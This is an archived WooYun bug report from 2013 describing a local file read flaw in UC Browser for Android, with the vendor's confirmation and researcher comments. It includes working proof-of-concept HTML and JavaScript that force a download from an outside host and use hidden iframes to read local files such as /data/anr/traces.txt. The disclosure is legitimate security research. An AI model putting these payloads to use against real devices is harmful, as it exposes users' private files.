{"id": 8664, "wybug_id": "wooyun-2013-032646", "wybug_title": "UC浏览器本地文件读取漏洞", "wybug_corp": "UC Mobile", "wybug_author": "evavus", "wybug_date": "2013-07-29 10:46", "wybug_open_date": "2013-10-27 10:47", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-07-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-09-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-27：\t细节向公众公开  简要描述： RT 详细说明：  UC浏览器最新版可通过下面的链接自动下载文件。\next:uc_dw:http://www.evil.com/evil.html\nUC浏览器默认的下载路径为/sdcard/UCDownloads所以自动下载保存文件名为/sdcard/UCDownloads/evil.htmlUC浏览器虽然禁止在http://的页面中直接调用file://，但还是可以从http://跨到file://。POC如下:\n<iframe src=ext:wo:file:///evil.html></iframe>\n接下来就可以读取本地文件了，最后的POC如下:\n<meta http-equiv=\"refresh\" content=\"0;URL=ext:uc_dw:http://fuzzing.duapp.com/evil.html\"/><script> function init(){   window.location = \"getdata.html\"; } setTimeout(init,5000)  //5秒后跳转</script>\nevil.html的代码如下:\n<iframe id=test style=display:none src=ext:wo:file://///data/anr/traces.txt onload=getdata()></iframe><script> function getdata(){var data=document.getElementById(\"test\").contentWindow.document.body.innerHTML; alert(data);} </script>\ngetdata.html的代码如下:\n<iframe style=display:none src=ext:wo:file://///sdcard/UCDownloads/evil.html></iframe>\n   漏洞证明：  非极速模式下访问下面的链接即可获取/data/anr/traces.txt的内容\nhttp://fuzzing.duapp.com/uc.html\n\n\nPS: UC浏览器下载路径须为/sdcard/UCDownloads   修复方案：     版权声明：转载请注明来源 evavus@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2013-07-29 13:10 厂商回复： 漏洞已验证，研发正在处理，谢谢evavus提供的漏洞信息。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-29 11:13 |    \t\tMorker \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:24        | 双手是最重要的、、、)\t\t \n  @evavus 原来你昨天问我，就是这个啊    \n     2013-07-29 11:53 |    \t\tevavus \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:11        | @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...)\t\t \n  @Morker  X,D    \n     2013-07-29 15:34 |    \t\tMorker \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:24        | 双手是最重要的、、、)\t\t \n  @evavus ...    \n     2013-09-07 13:59 |    \t\t爱梅小礼 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:16        | 我怀念的是无话不说)\t\t \n  二进制文件读不了的吧    \n     2013-09-07 18:19 |    \t\tevavus \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:11        | @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...)\t\t \n  @爱梅小礼 xhr好像用不了    \n     2013-09-09 10:40 |    \t\t爱梅小礼 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:16        | 我怀念的是无话不说)\t\t \n  @evavus 没多久就补了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}